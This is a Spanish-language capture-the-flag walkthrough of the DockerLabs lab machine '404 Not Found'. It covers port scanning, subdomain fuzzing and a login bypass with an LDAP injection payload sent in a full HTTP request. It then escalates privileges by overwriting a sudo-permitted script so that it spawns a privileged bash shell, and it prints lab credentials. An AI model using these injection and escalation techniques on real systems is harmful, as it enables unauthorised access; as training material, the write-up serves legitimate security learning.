#MAQUINA #DOCKERLABS #MEDIO
#SUBDOMAINS #LDAP #LDAPI
<hr>

# RECONOCIMIENTO

Vamos a resolver **404 Not Found** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS -vvv -p- --min-rate 5000 -n -Pn 172.17.0.2
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 09:01 CET
Initiating ARP Ping Scan at 09:01
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 09:01, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 09:01
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 09:01, 0.50s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-02-24 09:01:27 CET for 0s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)



```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene los puertos **22(SSH)**, **80(HTTP)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80 172.17.0.2                       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 09:02 CET
Nmap scan report for hidden.lab (172.17.0.2)
Host is up (0.000017s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 59:4e:10:e2:31:bf:13:43:c9:69:9e:4f:3f:a2:95:a6 (ECDSA)
|_  256 fb:dc:ca:6e:f5:d6:5a:41:25:2b:b2:21:f1:71:16:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Did not follow redirect to http://404-not-found.hl/
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.50 seconds



```

```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 09:03 CET
Nmap scan report for 404-not-found.hl (172.17.0.2)
Host is up (0.0000040s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds




```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.


## HTTP (80)

Al revisar la web vemos un texto en base64 (la clave secreta en el participar.html) que nos dice que revisemos la URL.

Vamos a usar **wfuzz** para encontrar subdominios.

```bash
wfuzz -u "http://404-not-found.hl" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.404-not-found.hl" --hc=301
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://404-not-found.hl/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                  
=====================================================================

000000097:   200        149 L    152 W      2023 Ch     "info"                                                                                                                   
000009532:   400        10 L     35 W       299 Ch      "#www"                                                                                                                   
000010581:   400        10 L     35 W       299 Ch      "#mail"                                                                                                                  
000047706:   400        10 L     35 W       299 Ch      "#smtp"                                                                                                                  
000103135:   400        10 L     35 W       299 Ch      "#pop3"                                                                                                                  

Total time: 0
Processed Requests: 114441
Filtered Requests: 114436
Requests/sec.: 0

```

Efectivamente, tenemos **info.404-not-found.html**

## info.404-not-found.html(80)

Vemos que tenemos un login y si hacemos CTRL + U, vemos un comentario diciendo que es un LDAP.

# EXPLOTACION

Abrimos burpsuite para intentar tensarlo, vemos inicialmente dos parámetros(username y password).

Tras un rato, logro acceder de la siguiente manera:

```bash
POST /login.php HTTP/1.1
Host: info.404-not-found.hl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: http://info.404-not-found.hl
Connection: keep-alive
Referer: http://info.404-not-found.hl/index.html
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=*)(|(*)&password=*
```

Significado : LDAP busca un usuario cualquiera (`*)`) cuya password sea cualquiera o la introducida(`(|(*)`).

Esto es porque la web usa una comprobación igual a  : `(&(user=*)(|(*)(pass=pwd))`

```bash
        <div class="admin-credentials">
            <h2>Credenciales de Admin</h2>
            <p>Nombre de usuario: <code>404-page</code></p>
            <p>Contraseña: <code>not-found-page-secret</code></p>
        </div>
```

YA ESTAMOS COMO 404-PAGE.

# ESCALADA PRIVILEGIOS

Vemos si el usuario tiene permisos SUDO:
   ```bash
404-page@a5272c83bf50:~$ sudo -l
Matching Defaults entries for 404-page on a5272c83bf50:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User 404-page may run the following commands on a5272c83bf50:
    (200-ok : 200-ok) /home/404-page/calculator.py


```

Vemos **calculator.py** con permisos SUDO, borramos el archivo y ejecutamos esto:

   ```bash
   
404-page@a5272c83bf50:~$ cat calculator.py 
#!/bin/bash

/bin/bash -p
404-page@a5272c83bf50:~$ sudo -u 200-ok /home/404-page/calculator.py
200-ok@a5272c83bf50:/home/404-page$ 

```

YA ESTAMOS COMO 200-OK.

Vemos su directorio personal :

```bash
200-ok@a5272c83bf50:/home$ cd 200-ok/
200-ok@a5272c83bf50:~$ ls -la
total 44
drwxr-x--- 1 200-ok 200-ok 4096 Aug 19  2024 .
drwxr-xr-x 1 root   root   4096 Aug 19  2024 ..
-rw------- 1 200-ok 200-ok  275 Feb 24 10:52 .bash_history
-rw-r--r-- 1 200-ok 200-ok  220 Aug 19  2024 .bash_logout
-rw-r--r-- 1 200-ok 200-ok 3771 Aug 19  2024 .bashrc
drwxrwxr-x 3 200-ok 200-ok 4096 Aug 19  2024 .local
-rw-r--r-- 1 200-ok 200-ok  807 Aug 19  2024 .profile
-rw-r--r-- 1 root   root     20 Aug 19  2024 boss.txt
-rw-r--r-- 1 root   root     33 Aug 19  2024 user.txt
200-ok@a5272c83bf50:~$ cat boss.txt 

What is rooteable

200-ok@a5272c83bf50:~$ su root
Password: 
root@a5272c83bf50:/home/200-ok# whoami
root
root@a5272c83bf50:/home/200-ok# 

```

**YA ESTAMOS COMO ROOT.**